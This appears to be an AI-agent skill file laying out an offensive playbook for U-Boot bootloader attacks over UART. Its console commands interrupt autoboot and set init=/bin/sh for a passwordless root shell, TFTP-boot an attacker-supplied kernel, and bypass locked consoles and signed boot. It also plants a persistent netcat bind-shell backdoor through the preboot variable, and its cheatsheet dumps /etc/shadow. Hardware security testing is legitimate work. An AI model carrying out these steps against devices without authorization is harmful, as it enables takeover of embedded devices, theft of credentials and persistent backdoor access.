---
name: offensive-uboot-bypass
description: "U-Boot bootloader attack methodology — autoboot countdown bypass, env-variable injection, custom bootargs for init=/bin/sh, U-Boot console commands for memory dump and TFTP boot, locked U-Boot bypass via env-variable corruption / fault injection, U-Boot CVE exploitation, and modifying U-Boot env on flash to gain persistent boot-time access. Use to bypass authentication and acquire root shells on devices that present a U-Boot console on UART."
---

# U-Boot Bootloader Attacks

U-Boot runs before the kernel and has direct access to memory, flash, and the network. Drop into its console once and you've already won — the kernel hasn't enforced any policy yet.

## Quick Workflow

1. Power on with UART connected; watch for autoboot countdown
2. Mash a key during the countdown to drop to console
3. Use `printenv` to learn the boot flow
4. Set `bootargs init=/bin/sh` and `boot` to land in single-user shell
5. If countdown is locked, use environment-variable corruption or fault injection

---

## Console Drop on Boot

```
U-Boot 2018.05 (Mar 12 2024 - 13:42:11 +0000)

Hit any key to stop autoboot:  3   ← mash space here
=>
```

Standard countdown is 1–5 seconds. Press any key during this window.

If you miss the window, reboot. Fast keyboards / serial terminals give margin.

## Common Console Commands

```
=> printenv                # show all environment variables
=> printenv bootcmd        # show what U-Boot does on autoboot
=> printenv bootargs       # show kernel command line
=> setenv bootargs ${bootargs} init=/bin/sh
=> boot                    # execute bootcmd with new env
```

The `init=/bin/sh` kernel arg makes Linux drop directly to a root shell instead of running init scripts (and login). No password.

## U-Boot Flash Commands

```
=> sf probe                # SPI flash detection
=> sf read 0x80000000 0x100000 0x100000   # read flash to RAM
=> mmc info                # eMMC info
=> mmc read 0x80000000 0x100 0x1000        # read eMMC blocks to RAM

=> md.b 0x80000000 0x100   # dump memory bytes
=> mw.l 0x80000000 0xCAFEBABE   # write memory word
```

Memory accessible from U-Boot includes the kernel image about to be loaded — patching here patches the running kernel.

## TFTP Network Boot

```
=> setenv ipaddr 10.0.0.50
=> setenv serverip 10.0.0.10
=> tftpboot 0x80000000 attacker_kernel.uimage
=> bootm 0x80000000
```

You boot whatever kernel image you serve over TFTP. Useful when the on-flash kernel is signed but `bootm` doesn't enforce the signature.

## Loading via Serial (Xmodem / Y-Modem)

When network isn't available:

```
=> loadb 0x80000000   # then send file via UART (kermit / minicom)
=> bootm 0x80000000
```

Slower than TFTP but works through any UART connection.

## Locked U-Boot Bypass

### Disabled Autoboot Key

Some vendors set `bootdelay=0` or override the keypress check. The console never accepts key input.

Bypasses:

- **Environment corruption**: identify where U-Boot env lives in flash. Erase / modify with chip-off (see `offensive-flash-dumping`). Restore boot delay.
- **Custom magic key**: vendor uses an undocumented keypress combo. Brute force or RE the U-Boot binary.
- **U-Boot version recognition**: older U-Boot versions accept Ctrl+C, Ctrl+B as universal break.

### Locked Console

Some vendors run a custom `cmd_run_loop` that ignores console input until specific challenge passed. Three paths:

- Modify the U-Boot binary to remove the challenge (chip-off + reflash)
- Fault-inject the challenge check (see `offensive-fault-injection`)
- Corrupt env to bypass the challenge configuration

### Signed Boot Enforcement

`bootm` may reject unsigned kernel images. Bypass:

- Downgrade to older signed image (anti-rollback fuse not blown)
- Use `bootm` with valid header + payload swap (some old U-Boot doesn't sign payload)
- Fault-inject the signature check
- Find the vendor signing key (insider threat / supply chain — out of scope unless authorized)

## Modifying U-Boot Env on Flash

If you have flash dump + write access:

```bash
# U-Boot env is stored as plain CRC + key=value entries
# Tool: u-boot-env-tools
fw_printenv -c uboot.env       # read env from a flash partition file
fw_setenv -c uboot.env bootdelay 5   # restore boot delay
fw_setenv -c uboot.env bootargs "${bootargs} init=/bin/sh"
```

Then reflash the env partition with the modified blob. U-Boot reads modified env on next boot and behaves accordingly.

## U-Boot CVEs

| CVE | Class | Impact |
|---|---|---|
| CVE-2022-30790 (and 2x related) | IP packet handling overflow | Network-side RCE in U-Boot's network stack |
| CVE-2020-10648 | NFS overflow | Network RCE |
| CVE-2018-1000205 | DOS NFS | Boot DoS |
| Various U-Boot fdt_path overflow | DTB parsing | RCE if attacker controls boot blob |

Most U-Boot CVEs require local console + crafted commands. Network-side ones require U-Boot to do TFTP/NFS — not all configurations.

## Persistent Backdoor via U-Boot

Modifying U-Boot env to persistently run a backdoor:

```
=> setenv preboot 'echo backdoor > /tmp/.x; nc -lp 4444 -e /bin/sh &'
=> saveenv
=> reset
```

`preboot` runs before `bootcmd`. If `preboot` injects shell commands into the kernel command line / initramfs script, you have persistence at every boot.

## Detection

| Defense | Implication |
|---|---|
| `silent` env var set | U-Boot suppresses console output but accepts input — still attackable |
| Boot-time integrity check (kernel signed by vendor) | Modified images rejected |
| Anti-rollback fuses | Older signed images can't be installed |
| Console disabled in production builds | UART exists but no characters processed |

Custom-built consumer firmware often has none of these defenses. Industrial / automotive often has all of them.

## Engagement Cheatsheet

```bash
# 1. UART connected; watch boot
sudo screen /dev/ttyUSB0 115200

# 2. Power on; mash space during countdown

# 3. Once at => prompt:
=> printenv
=> printenv bootargs
=> setenv bootargs ${bootargs} init=/bin/sh
=> boot

# 4. Inside Linux: full root shell
# id; cat /etc/shadow; mount; lsmod

# 5. Persistence (if authorized):
# Boot back to U-Boot; setenv preboot '...'; saveenv

# 6. If countdown fails, modify env on flash via chip-off
```

## Reporting

- U-Boot version observed (`U-Boot <ver>`)
- Whether console drop required physical access only or was reachable via SPI flash
- The exact env modifications used for shell access
- Whether persistence was achieved
- Vendor mitigation: signed boot, fused console-disable, encrypted env

---

## Key References

- U-Boot project documentation: u-boot.readthedocs.io
- "Hacking U-Boot" research presentations from various BlackHat / CCC talks
- u-boot-env-tools: github.com/sbabic/u-boot-env-tools
- Source: https://github.com/SnailSploit/offensive-checklist/blob/main/iot.md
